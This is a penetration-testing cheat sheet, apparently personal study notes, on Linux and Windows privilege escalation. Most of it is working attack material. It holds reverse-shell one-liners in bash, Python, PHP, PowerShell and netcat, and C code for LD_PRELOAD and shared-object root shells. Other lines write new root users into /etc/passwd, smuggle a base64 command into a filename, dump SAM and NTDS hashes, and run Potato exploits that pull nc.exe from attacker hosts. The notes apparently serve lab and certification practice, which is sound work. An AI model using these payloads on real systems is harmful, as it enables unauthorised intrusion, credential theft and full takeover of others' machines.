1. Check your user with `id` and `whoami`
2. Run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with increasing levels
   - starting from lvl `0` to `2`, `./lse.sh -l 0`
3. Run other scripts like `lse_cve.sh`
4. Check for default / weak credentials
   - example: `username:username`, `root:root`
5. Check the directory `opt/` for possible apps to exploit
6. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

#### <ins>Reverse Shell</ins>

**PHP**
```php
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Python**

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Bash**
```bash
#!/bin/bash
/usr/bin/bash -i >& /dev/tcp/192.168.45.226/445 0>&1
```


**More shells**
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Generator](https://www.revshells.com/)
- [Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
  - `python -c 'import pty;pty.spawn("/bin/bash")'`
  - `/usr/bin/script -qc /bin/bash /dev/null`

#### <ins>Service Exploits</ins>

- `ps aux | grep "^root"` Show all process running as root
- Identify the program version with `<program> --version` or `<program> -v`
  - On Debian like systems, run ` dpkg -l | grep <program>`
  - On systems that use rpm, run `rpm –qa | grep <program>`

**Check services running on localhost**
- `netstat -tlpn`
- `ss -antp`
- `ps -auxwf`

**Check which services run as root**
- ```
  find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
  ps -aux | grep root | grep sql
  ss -antp
  ```
- note: if you find `relayd`
  - `/usr/sbin/relayd -C /etc/shadow`
  - now you can read `/etc/shadow`

**MySQL service running as root with no password assigned**
- Run `mysqld --version`
- One great exploit is the following: [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
  - Once the UDF is installed, run the following command in the MySQL shell: `mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`
  - Run `/tmp/rootbash` for a root shell: `/tmp/rootbash -p`

#### <ins>Weak File Permissions</ins>

**Readable /etc/shadow**
- Check if `/etc/shadow` is readable with `ls -l /etc/shadow`
- ```
  cat /etc/shadow > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- shadow + passwd
  ```
  unshadow passwd shadow > passwords
  john --wordlist=/usr/share/wordlists/rockyou.txt passwords
  ```

**Readable /etc/passwd**
- if you find hashes
  ```
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```

**Writable /etc/shadow**
- Check if `/etc/shadow` is writable with `ls -l /etc/shadow`
- Generate a new password hash with `mkpasswd -m sha-512 newpass`
- Substitute the root password hash with the new hash with `nano /etc/shadow`

**Writable /etc/passwd**
1. Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
2. Generate a new password hash with `openssl passwd newpass`
3. Substitute the root password hash with the new hash with `nano /etc/passwd`
   - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
     - test the new user with `su root2` and `id`


#### <ins>Exposed Confidential Information</ins>

- `env` inspect environment variables
  - `/etc/environment`
- `cat .bashr` ispect .bashrc
- `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
- `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
- `history`
- `cat ~/.profile`

**Password disclosure**
- `watch -n 1 "ps -aux | grep pass"`
- `sudo tcpdump -i lo -A | grep "pass"`
- search for passwords
  - `grep -rnw . -ie password --color=always 2>/dev/null`
  - `grep -rnw . -ie tom --color=always 2>/dev/null`
  - `grep -rnw . -ie DB_PASSWORD --color=always 2>/dev/null`
- check `wp-config.php` in:
  - `/var/www/html`
  - `/srv/http`

#### <ins>SSH</ins>
- `find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null` find SSH keys

#### <ins>Sudo</ins>

**Classic method**
- Try to run `sudo su`
- If `su` doesn't work, try with the followings
  - `sudo -s`
  - `sudo -i`
  - `sudo /bin/bash`
  - `sudo passwd`

**Shell Escape Sequences**
- `sudo -l` list the programs which sudo allows your user to run
- See [GTFOBins](https://gtfobins.github.io) and search for the program names

If you find something like the following, see if there are any services that can be restarted to have reverse shell as root
```
(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```
- sudo /sbin/reboot

Path traversal:
1. `sudo -l` > `(ALL) NOPASSWD: /usr/bin/tee /var/log/httpd/*`
2. add new user 'toor:password' > `echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd`

**Environment Variables**
- `sudo -l` check which environment variables are inherited, look for the `env_keep` options
  - `LD_PRELOAD` loads a shared object before any others when a program is run 
  - `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
- First solution
  - Create a shared object with `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c`, use the code below
    ```C
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
  
    void _init() {
    	unsetenv("LD_PRELOAD");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - `sudo LD_PRELOAD=/tmp/preload.so <program name>` Run one of the programs you are allowed to run via sudo while setting the `LD_PRELOAD` environment variable to the full path of the new shared object
- Second solution, with `apache`
  - See which shared libraries are used by apache `ldd /usr/sbin/apache2`
  - Create a shared object with the same name as one of the listed libraries, `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c`
  - ```C
    #include <stdio.h>
    #include <stdlib.h>
    
    static void hijack() __attribute__((constructor));
    
    void hijack() {
    	unsetenv("LD_LIBRARY_PATH");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - Run `apache2` using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`, where the output of the compiled shared object is

**sudoedit**
If you find Sudo < 1.8.15 and something like: `(root) NOPASSWD: sudoedit /home/*/*/recycler.ser`
- CVE-2015-5602, see https://al1z4deh.medium.com/proving-grounds-cassios-4686e6fa8df6

#### <ins>Cron Jobs</ins>

Run:
- `cat /etc/crontab`, `crontab -l`, `pspy`
- `grep "CRON" /var/log/syslog`
- 

**File Permissions**
- View the contents of the system-wide crontab `cat /etc/crontab`, the cron log file `grep "CRON" /var/log/syslog` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
- If one of them is world-writable, substitute it with the following
  ```C
  #!/bin/bash
  bash -i >& /dev/tcp/<Your-IP>/4444 0>&1
  ```
  - You can also try with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your-IP> 4444 >/tmp/f`
- Open a listener with `nc -nvlp 4444`

**PATH Environment Variable**
- See [Task 9 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- The crontab `PATH` environment variable is by default set to `/usr/bin:/bin` and can be overwritten in the crontab file
- It might be possible to create a program or script with the same name as the cron job if the program or script for a cron job does not utilize an absolute path and one of the PATH directories is editable by our user.

**Wildcards**
- See [Task 10 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`
  - make it executable `chmod +x shell.elf`
- run other commands as part of a checkpoint feature
  - `touch /home/user/--checkpoint=1`
  - `touch /home/user/--checkpoint-action=exec=shell.elf`

**apt running as root**
1. `cd /etc/apt/apt.conf.d/`
2. `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell`

#### <ins>SUID / SGID Executables</ins>

**setuid + GTFOBins**
- Check for setuid binaries on the machine
  - `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
  - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [GTFOBins](https://gtfobins.github.io/) to elevate your privileges

**wget + setuid**
- You can use it to add a root user
  1. obtain `/etc/passwd` from the victim
  2. add the new user `echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd`
     - password hash generated with `openssl passwd mypass`
  3. overwrite `/etc/passwd` > `wget http://ATTACKERIP/passwd -o /etc/passwd`

**Known Exploits**
- Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [Exploit-DB](https://www.exploit-db.com/), Google and GitHub to find known exploits

**Shared Object Injection**
- See [Task 12 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- `strace <program to run> 2>&1 | grep -iE "open|access|no such file"` run strace and search the output for open/access calls and for "no such file" errors
- ```C
  #include <stdio.h>
  #include <stdlib.h>
  
  static void inject() __attribute__((constructor));
  
  void inject() {
  	setuid(0);
  	system("/bin/bash -p");
  }
  ```
  
**Environment Variables**
- See [Task 13 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

**Abusing Shell Features (#1)**
- See [Task 14 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- > "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
  - ```
    function /usr/sbin/service { /bin/bash -p; }
    export -f /usr/sbin/service
    ```

**Abusing Shell Features (#2)**
- See [Task 15 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc). Note: This doesn't work on Bash versions 4.4 and above
- > "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <program>`
  - `/tmp/rootbash -p`

#### <ins>Passwords & Keys</ins>
- View the content of history with `cat ~/.*history | less` and search for secrets
- Search for config files as they often contain passwords in plaintext or other reversible formats (example: `*.ovpn`)
- Search for backups and hidden files
  - `ls -la /` look for hidden files & directories in the system root
  - Other common locations to check
    - `ls -la /home/user`
    - `ls -la /tmp`
    - `ls -la /var/backups`
  - See [Task 18 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

#### <ins>Kernel Exploits</ins>
- Enumerate the kernel version `uname -a`
- Find an exploit, example: `searchsploit linux kernel 2.6.32 priv esc`
- Some resources
  - Find possible exploits with [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
  - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)

#### <ins>CVE</ins>

- see `/etc/issue`
- `cat /etc/*release*`
- CVE-2021-4034 > PwnKit Local Privilege Escalation
- Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation
- Dirty COW
  - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  - https://dirtycow.ninja/
  - "Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka 'Dirty COW.'"
- See the general services that are running. For example, you may have found several web ports open during the initial phase, and found different services. See if there are any CVEs or exploits for PE

#### <ins>find with exec</ins>
- Also known as "Abusing Setuid Binaries"
- `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
- See more here: [find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

#### <ins>find PE</ins>

- Example cron job running clean-tmp.sh:
  ```
  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
  #! /bin/bash
  find /dev/shm -type f -exec sh -c 'rm {}' \;
  ```
  - Exploit:
    ```
    jane@assignment:~$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
    jane@assignment:~$ bash -p
    ```

#### <ins>Abusing capabilities</ins>
- `/usr/sbin/getcap -r / 2>/dev/null` enumerate capabilities
  - Search for `cap_setuid+ep`, meaning that setuid capabilities are enabled, effective and permitted
- Search what you need in [GTFOBins](https://gtfobins.github.io/)
  - Example with Perl: `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`


#### <ins>Escape shell</ins>

- [With tar](https://gtfobins.github.io/gtfobins/tar/#shell)
  1. create an sh with a nc command for a reverse shell > name 'exploit.sh'
  2. `touch ./"--checkpoint=1"`
  3. `touch ./"--checkpoint-action=exec=bash exploit.sh"`
- https://vk9-sec.com/linux-restricted-shell-bypass/
- https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

#### <ins>Docker</ins>

- If your user is part of the 'docker' group
  - find an image with `docker images`
  - `docker run -v /:/mnt --rm -it IMAGE chroot /mnt sh`

Escape container
- If the first thing you see when you get access to the machine is a file `.dockerenv` and the hostname is something like `0873e8062560`, it means that you are in a docker container
- https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/

Process
1. List host's disks
   - `fdisk -l`
2. Attempt mount `disklo`
   - `mkdir /tmp/mnt1`
   - `mount /dev/sda1 /tmp/mnt1`
   - `cd /tmp/mnt1`
3. Now you can navigate `sda1` in `/tmp/mnt1`
- If you find an internal ip / service (maybe with `ifconfig`, `netstat -ano` or `cat /etc/hosts`), try this
  1. `ssh -l root 172.17.0.2`

Docker Container Escape via SNMP
- SNMP test
  1. Look for `.snmpd.conf` (maybe in `/var/backups`)
     - found community string: `rocommunity 53cur3M0NiT0riNg`
     - Found NET-SNMP-EXTEND-MIB tables (`nsExtendConfigTable`, `nsExtendOutput1Table` and `nsExtendOutput2Table`) > this means RCE
  2. `sudo download-mibs`
  3. `set mibs +ALL in /etc/snmp/snmp.conf`
  4. `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
     - notice if the query works
- docker escape
   1. VICTIM:
      ```
      echo 'bash -c "bash -i >& /dev/tcp/192.168.45.216/4444 0>&1"' > /tmp/shtest
      chmod +x /tmp/shtest
      ```
   3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`

#### <ins>User groups</ins>
- If your user is part of the group `disk`:
  1. `df -h`
  2. `debugfs /dev/sd[a-z][1-9]`  example: `sda1`
  3. `debugfs: cat /root/.ssh/id_rsa`
- group `video`: [HackTricks | Video Group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group)

#### <ins>fail2ban</ins>
- See: "[Privilege Escalation with fail2ban nopasswd](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)"
- fail2ban config: `/etc/fail2ban/jail.conf`
- ```
  /etc/fail2ban/action.d/iptables-multiport.conf
  actionban = reverse shell
  ```
- trigger the ban with hydra

#### <ins>Postfix</ins>

- [How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)
- [Pg Practice Postfish writeup](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)


### <ins>Windows Privilege Escalation</ins>

#### <ins>Checklist</ins>

See [Information gathering | Windows](#windows). Always obtain:
- [ ] Username and hostname
- [ ] Group memberships of the current user
- [ ] Existing users and groups
- [ ] Operating system, version and architecture
- [ ] Network information
- [ ] Installed applications
- [ ] Running processes

#### <ins>Resources</ins>
- [Windows PrivEsc | TryHackMe](https://tryhackme.com/room/windows10privesc)
- [Windows Privilege Escalation for OSCP & Beyond!](https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574)

**Tools**
- [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
- [MinGW-w64](https://www.mingw-w64.org/)
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Windows persistence](#windows-persistence)
- Scripts
  - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
    - [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
      - `.\Seatbelt.exe all`
      - `.\Seatbelt.exe -group=all -full`
  - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) (archived)
    - [SharpUp](https://github.com/GhostPack/SharpUp)
    - [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
  - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
  - [Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
    - `windows-privesc-check2.exe -h`
    - `windows-privesc-check2.exe --dump -G`
  - [creddump7](https://github.com/Tib3rius/creddump7)

#### <ins>Strategy</ins>

- [ ] Run the following commands
  - `whoami /priv`
  - `whoami /groups`
  - `whoami /all`
  - `netstat -ano`
  - especially seek out for services like `mssql`
- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
  - see the dedicated sections for more inspiration + known exploits
- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
- [ ] See the programs installed in their directories
- [ ] Run the scripts
  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
  - `.\seatbelt.exe NonstandardProcesses`
  - `PowerUp.ps1` -> `Invoke-AllChecks`
  - `windows-privesc-check.exe --dump -G`
  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
  - `.\jaws-enum.ps1`
  - more
    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
    - https://github.com/SnaffCon/Snaffler
- [ ] With meterpreter, you can run the module `local_exploit_suggester`
- [ ] In `C:`, run the command `dir -force` to see the hidden directories
  - one interesting directory is `PSTranscripts/Transcripts`
  - keep using `dir -force` inside of the hidden directories
- [ ] Check LOLBAS: https://lolbas-project.github.io/
- [ ] If out of ideas / luck:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  - http://pwnwiki.io/#!privesc/windows/index.md
  - https://fuzzysecurity.com/tutorials/16.html

#### <ins>Privileges</ins>
- Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
- List your privileges: `whoami /priv`, see also https://github.com/gtworek/Priv2Admin
  - `SeImpersonatePrivilege`
  - `SeAssignPrimaryPrivilege`
  - `SeBackupPrivilege`
  - `SeRestorePrivilege`
  - `SeTakeOwnershipPrivilege`
  - `SeTcbPrivilege`
  - `SeCreateTokenPrivilege`
  - `SeLoadDriverPrivilege`
  - `SeDebugPrivilege`
- More privs: [FindSuspiciousPermissions.ps1](https://github.com/fashionproof/FindSuspiciousPermissions/blob/main/FindSuspiciousPermissions.ps1)

**AlwaysInstallElevated**
- You can run any `.msi`

**SeLoadDriverPrivilege**
- https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#strategy
- https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
- See also [HackTheBox Fuse](https://app.hackthebox.com/machines/Fuse)

**SetRestorePrivilege**
- `./SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"`

**SeManageVolumePrivilege**
1. `.\SeManageVolumeAbuse.exe`
2. `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f dll -o tzres.dll`
3. `cp tzres.dll C:\Windows\System32\wbem\`

**SeImpersonatePrivilege**

PrintSpoofer
- `.\PrintSpoofer.exe -i -c powershell.exe`
- `.\PrintSpoofer.exe -i -c "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`

JuicyPotato
- `.\JuicyPotato.x86.exe -t * -p "\\10.10.14.10\Share\nc.exe 10.10.14.10 88 -e cmd.exe" -l 443`
- `.\JuicyPotato.exe -t * -p C:\User\mario\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}`
  - In `root.bat`, use the following once at time
    ```
    whoami /all > C:\Users\Public\proof.txt   <# verify that you are authority #>
    net user Administrator abc123!            <# modify Administrator password to then login with psexec #>
    ```
  - See here for CLSID for the value of the flag `-c`: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise

Other
- `.\GodPotato-NET4.exe -cmd "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`
  - Affected version: Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
- `.\RogueWinRM.exe -p "\\10.10.14.26\Share\nc.exe" -a "-e cmd.exe 10.10.14.26 88"`
  
  
**SeBackupPrivilege**
1. https://github.com/giuliano108/SeBackupPrivilege
   ```
   import-module .\SeBackupPrivilegeUtils.dll
   import-module .\SeBackupPrivilegeCmdLets.dll
   ```
2. `iwr -uri http://10.18.110.121/diskshadow.txt -o diskshadow.txt`
   - If you have modified `diskshadow.txt` and it doesn't work, run: `unix2dos diskshadow.txt`
3. `diskshadow /s diskshadow.txt`
4. `cd E:`
5. `robocopy /b E:\Windows\ntds . ntds.dit`
6. ```
   reg save hklm\system c:\tmp\system
   reg save hklm\sam c:\tmp\sam
   ```
7. ```
   download ntds.dit
   download system.bak
   download sam
   ```
8. `samdump2 system sam`
9. `impacket-secretsdump -ntds ntds.dit -system system LOCAL`


**SeRestorePrivelege**
1. list manual start service:
   ```
   cmd.exe /c sc queryex state=all type=service
   Get-Service | findstr -i "manual"
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name
   ```
2. Check seclogon, known to have manual start permissions and that can be started by all users
   ```
   reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
   cmd.exe /c sc sdshow seclogon
   - RP = Start Service / AU = All Users
   - winhelponline.com/blog/view-edit-service-permissions-windows/
   ```
3. SeRestoreAbuse exploit
   ```
   .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"
   ```
- See also: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#shell-as-system

#### <ins>Privileged Groups</ins>

- [Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

#### DnsAdmins
- https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
- `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
  - as a dll, try to use 'dns-exe-persistance.dll'
    - you have to recompile it with your IP
    - you can also use msfvenom
      - `msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll`
- Alternative
  1. `cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.34\share\da.dll`
  2. `sc.exe stop dns`
  3. `sc.exe start dns`
  
#### gMSA
- If your user is part of a group in 'PrincipalsAllowedToRetrieveManagedPassword'
  .\GMSAPasswordReader.exe --accountname 'svc_apache'
- Retrieve 'rc4_hmac' in Current Value
  evil-winrm -i 192.168.212.165 -u svc_apache$ -H 009E42B78BF6CEA5F5C067B32B99FCA6
- See accounts for Group Managed Service Account (gMSA) with Powershell
  Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

#### AD Recycle Bin
- It's a well-known Windows group. Check if your user is in this group
- Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
- Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
- See if there is any strange entry, like `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz`. There might be a password

#### <ins>Add new admin user</ins>

```C
#include <stdlib.h>
int main () {
    int i;
    i = system ("net user /add [username] [password]");
    i = system ("net localgroup administrators [username] /add");
    return 0;
}
```
- 32-bit Windows executable: `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
- 64-bit Windows executable: `x86_64-w64-mingw32-gcc -o adduser.exe adduser.c`
- Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
- verify that the user has been added with `net user`
- run `echo password | runas /savecred /user:rootevil cmd`

#### <ins>Log in with another user from the same machine</ins>

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```

#### <ins>Generate a reverse shell</ins>

1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\<IP>\kali\reverse.exe C:\PrivEsc\reverse.exe`

Create a PowerShell remoting session via WinRM
1. `$password = ConvertTo-SecureString <password> -AsPlainText -Force`
2. `$cred = New-Object System.Management.Automation.PSCredential("<password>", $password)`
3. `Enter-PSSession -ComputerName <computer_name> -Credential $cred`

Check also:
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
  - `evil-winrm -i <IP> -u <username> -p <password>`
- [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
  ```powershell
  # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

  $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```

Other shells with msfvenom
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
- `msfvenom -p windows/×64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f exe -e 64/xor -o shell.exe`
- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -p windows/shell_reverse_tcp --list formats`
- `msfvenom -p windows/shell_reverse_tcp --list-options`

 
#### <ins>Kernel Exploits</ins>

1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
   - Try also the command: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
2. Use it with [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) to find potential exploits: `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
   - See also: [Watson](https://github.com/rasta-mouse/Watson)
3. See [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### <ins>Driver Exploits</ins>
1. Enumerate the drivers that are installed on the system: `driverquery /v`
2. Search in the Exploit Database

#### <ins>Service Exploits</ins>

Note: to find running services, use this command from the powershell: `Get-Service` or `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

**Service Commands**
```
sc.exe qc <name>                                 Query the configuration of a service
sc.exe query <name>                              Query the current status of a service
sc.exe config <name> <option>= <value>           Modify a configuration option of a service
net start/stop <name>                            Start/Stop a service
```

**Insecure Service Permissions**
1. Use AccessChk to check the "user" account's permissions on the "daclsvc" service:
   - `C:\PrivEsc\accesschk.exe /accepteula -uwcqv <user> <service>`
2. If `SERVICE_CHANGE_CONFIG` is present, it's possible to change the service configuration
3. Query the service. If it runs with `SYSTEM` privileges, it's possible a privilege escalation
   - `sc qc <service>`
